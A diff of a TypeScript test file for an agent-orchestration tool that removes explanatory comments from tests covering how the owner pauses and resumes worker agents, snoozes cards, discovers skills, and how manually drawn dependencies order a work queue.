     expect(worker.inbox.at(-1)).toContain('The owner pauses you now');
     expect(c.board.item(a.id)?.hold?.reason).toBe('pausing');
@@ -1677,7 +1677,7 @@ test("pausing a project's agents pauses each at work, holds the cards let start 
     expect(worker.closed).toBe(true);
     expect(c.board.item(a.id)?.hold?.reason).toBe('paused');
     expect(c.board.project).toMatchObject({ paused: true, agents: { running: 0, paused: 1 } });
-    // a card started meanwhile: the Koordinator judges it as ever, and it waits in the queue
+    
     const workers = () => runtime.sessions.filter((s) => s.spec.role === 'worker').length;
     const before = workers();
     const b = c.board.create({ title: 'B', x: 0, y: 0 });
@@ -1708,7 +1708,7 @@ test("a project's pause ends once none of its agents is paused any more, and las
     const worker = runtime.sessions.at(-1)!;
     worker.emit({ type: 'session', id: 's-a' });
     worker.emit({ type: 'text', text: 'Arbeite.' });
-    // Seismic stops while the agent is about to pause: it is paused when Seismic runs again
+    
     c.pauseAgents();
   } finally {
     c.shutdown();
@@ -1716,7 +1716,7 @@ test("a project's pause ends once none of its agents is paused any more, and las
   c = new ProjectRuntime(config, { store, home: dir, runtime, forge: noForge });
   try {
     expect(c.board.project).toMatchObject({ paused: true, agents: { running: 0, paused: 1 } });
-    // the owner resumes the card on its own: nothing on the project is paused any more
+    
     c.act(a.id, { action: 'resume' });
     await heard();
     expect(c.board.project.paused).toBeUndefined();
@@ -1738,18 +1738,18 @@ test("a card the owner snoozed counts as no paused agent: resuming the project l
     };
     const later = await atWork('Later', 's-later');
     const now = await atWork('Now', 's-now');
-    // "Later": its worker stops until then, holding what comes for it as a paused one does
+    
     c.act(later.id, { action: 'snooze', until: new Date(Date.now() + 3_600_000).toISOString() });
     await heard();
     expect(c.board.project.agents).toEqual({ running: 1, paused: 0 });
     c.pauseAgents();
     await heard();
     expect(c.board.project).toMatchObject({ paused: true, agents: { running: 0, paused: 1 } });
-    // the one paused resumed on its own card: none is paused any more, and the queue runs again
+    
     c.act(now.id, { action: 'resume' });
     await heard();
     expect(c.board.project.paused).toBeUndefined();
-    // nor does resuming the project wake the snoozed one
+    
     c.resumeAgents();
     expect(c.board.item(later.id)?.hold).toMatchObject({ by: 'owner' });
     expect(runtime.sessions.some((s) => s.spec.resume === 's-later')).toBe(false);
@@ -1777,7 +1777,7 @@ test("a project's pause lasts while one of its paused agents cannot go on, its r
     await atWork(front!, 's-front');
     const gone = await atWork(back!, 's-back');
     c.pauseAgents();
-    // both end their turn at a safe point
+    
     for (const s of runtime.sessions.filter((s) => s.spec.resume === undefined && s.spec.role === 'worker').slice(-2)) s.emit({ type: 'idle' });
     await heard();
     expect(c.board.project.agents).toEqual({ running: 0, paused: 2 });
@@ -1788,11 +1788,11 @@ test("a project's pause lasts while one of its paused agents cannot go on, its r
     errors.restore();
     expect(errors.lines.join('\n')).toContain(`the agent of ${gone.id} did not resume`);
     expect(runtime.sessions.some((s) => s.spec.resume === 's-front')).toBe(true);
-    // the card that could not go on is still paused, and the cards let start still wait
+    
     expect(c.board.item(gone.id)?.hold?.reason).toBe('paused');
     await heard();
     expect(c.board.project).toMatchObject({ paused: true, agents: { paused: 1 } });
-    // its repository back, it goes on, and the pause ends
+    
     await c.apply({ name: 'Pause', repos: both });
     await until(() => c.repos.length === 2);
     c.resumeAgents();
@@ -1821,7 +1821,7 @@ describe("the skills of a card's agent", () => {
       const read = c.repos[0]!.read.path;
       expect(asked).toEqual([
         { cwd: read, plugins: [SEISMIC_PLUGIN], untrusted: false },
-        // an idea's agent loads no plugins
+        
         { cwd: read, plugins: [], untrusted: false },
       ]);
       useCodex = true;
@@ -1829,7 +1829,7 @@ describe("the skills of a card's agent", () => {
       expect(await c.skillsOf(task.id)).toEqual([{ name: 'review', description: 'Reviews' }]);
       c.board.work(task.id, { agent_setting: JSON.stringify({ model: 'opus', effort: 'high', harness: 'codex' }) });
       expect((await c.skillsOf(task.id)).map((s) => s.name)).toEqual(['seismic:browser', 'seismic:demo', 'seismic:labels', 'seismic:settings', 'seismic:titles']);
-      expect(asked).toHaveLength(2); // Codex discovery never starts a Claude SDK session
+      expect(asked).toHaveLength(2); 
       expect(await c.skillsOf('nope').catch(() => 'refused')).toEqual([]);
     } finally {
       c.shutdown();
@@ -1846,7 +1846,7 @@ test('a manual dependency holds a requested card until removed', async () => {
   const t = project.board.t.koordinator;
   expect(item(b.id).queue).toMatchObject({ behind: [a.id], reason: t.drawn });
   expect(item(b.id).state).toBe('planned');
-  // the card says why it waits: the owner connected it, not a wait Seismic inferred
+  
   expect(project.board.events(b.id).at(-1)).toMatchObject({ kind: 'state', author: 'seismic', text: t.waitsFor(t.notStarted('“Prerequisite”'), t.drawn) });
   project.board.connect(a.id, b.id, true);
   await until(() => item(b.id).state === 'working');
@@ -1893,7 +1893,7 @@ describe('owner-drawn dependencies in the queue', () => {
     await settle();
     expect(item(a.id).queue).toMatchObject({ behind: [b.id], manualWait: [b.id] });
     project.act(b.id, { action: 'start' });
-    // whatever B's estimate says, it cannot come to wait for A
+    
     await judge(true);
     expect(estimate().inbox[0]).not.toContain('"A"');
     expect(item(b.id).queue).toMatchObject({ behind: [expect.not.stringMatching(a.id)] });
@@ -1911,12 +1911,12 @@ describe('owner-drawn dependencies in the queue', () => {
     project.board.connect(p.id, b.id);
     await settle();
     expect(item(b.id).queue).toMatchObject({ behind: [a.id, p.id], manualWait: [p.id] });
-    // the arrow drawn while it waited is said once; the one over the inferred wait adds nothing to say
+    
     const t = project.board.t.koordinator;
     expect(project.board.events(b.id).filter((e) => e.author === 'seismic' && e.text.includes(t.drawn)).map((e) => e.text)).toEqual([t.waitsFor(t.notStarted('“Prerequisite”'), t.drawn)]);
     project.board.connect(a.id, b.id, true);
     await settle();
-    // a likely conflict holds only while A is in progress; the other arrow holds on
+    
     await project.repoOf(a.id).workers.stop(a.id);
     await settle();
     expect(item(b.id).queue).toEqual(expect.objectContaining({ behind: [p.id], manualWait: [p.id] }));
@@ -1933,7 +1933,7 @@ describe('owner-drawn dependencies in the queue', () => {
     project.board.connect(a.id, b.id);
     await project.repoOf(a.id).workers.stop(a.id);
     await settle();
-    // A stopped has not landed: the arrow still holds B
+    
     expect(item(b.id)).toMatchObject({ state: 'planned', queue: { behind: [a.id], manualWait: [a.id] } });
     project.board.connect(a.id, b.id, true);
     await until(() => item(b.id).state === 'working');
